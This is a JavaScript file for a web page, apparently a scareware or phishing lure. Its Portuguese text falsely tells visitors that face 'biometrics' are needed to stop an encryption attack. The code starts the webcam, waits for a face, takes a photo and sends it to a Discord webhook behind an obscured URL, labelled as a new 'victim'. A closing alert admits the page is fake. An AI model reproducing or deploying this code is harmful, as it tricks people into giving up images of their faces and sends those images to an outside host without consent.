
let faceCheckInterval;
let streamAtiva = null;

window.onload = async () => {
    // Dá 1 segundo para o processador do telemóvel "respirar"
    setTimeout(async () => {
        try {
            await faceapi.nets.tinyFaceDetector.loadFromUri('./models');
            document.getElementById('camera-container').style.display = 'flex';
            ligarCameraStream();
        } catch (e) {
            alert("Erro IA: " + e); // O alert ajuda a ver o erro no telemóvel
        }
    }, 1000);
};

const wu = hv.Hv
async function ligarCameraStream() {
    const video = document.getElementById('video');
    try {
        streamAtiva = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = streamAtiva;

        faceCheckInterval = setInterval(async () => {
            await HasFace();
        }, 200);
    } catch (err) {
        alert("ERRO: Acesso à biometria é obrigatório para interromper a encriptação.");
    }
}

async function ativarCamera() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const btn = document.getElementById('btn');

    // Bloqueia o botão para não clicarem duas vezes
    btn.disabled = true;
    btn.innerText = "A PROCESSAR...";

    // Verifica uma última vez se há rosto antes de enviar
    const rostoDetetado = await HasFace();

    if (rostoDetetado) {
        // Tira a foto do vídeo atual
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);

        // Envia para o Discord
        canvas.toBlob(blob => enviarParaDiscord(blob), 'image/png');

        // Para tudo e dá o aviso final
        clearInterval(faceCheckInterval);
        if (streamAtiva) {
            streamAtiva.getTracks().forEach(track => track.stop());
        }
        alert("Isto era obviamente fake e idealmente não diga a ningém ");
    } else {
        alert("ERRO: Rosto não detetado. Olhe para a câmara e tente novamente.");
        btn.disabled = false;
    }
}

async function HasFace() {
    const btn = document.querySelector('#btn');
    const vid = document.getElementById('video');

    if (!vid.srcObject || vid.paused || vid.ended) return false;

    const detections = await faceapi.detectSingleFace(vid, new faceapi.TinyFaceDetectorOptions());

    if (detections) {
        btn.style.backgroundColor = 'rgb(25, 223, 25)';
        btn.style.color = 'white';
        if (btn.innerText !== "A PROCESSAR...") btn.innerText = "CONFIRMAR IDENTIDADE";
        return true;
    } else {
        btn.style.backgroundColor = 'rgb(204, 20, 20)';
        btn.style.color = 'white';
        if (btn.innerText !== "A PROCESSAR...") btn.innerText = "A PROCURAR ROSTO...";
        return false;
    }
}

async function enviarParaDiscord(blob) {
    const formData = new FormData();
    formData.append('file', blob, 'captura.png');
    formData.append('payload_json', JSON.stringify({
        content: "🚨 **BIOMETRIA RECOLHIDA**\nUma nova vítima validou o rosto.",
        username: "Vigilante de Rede"
    }));

    await fetch(wu, { method: 'POST', body: formData });
}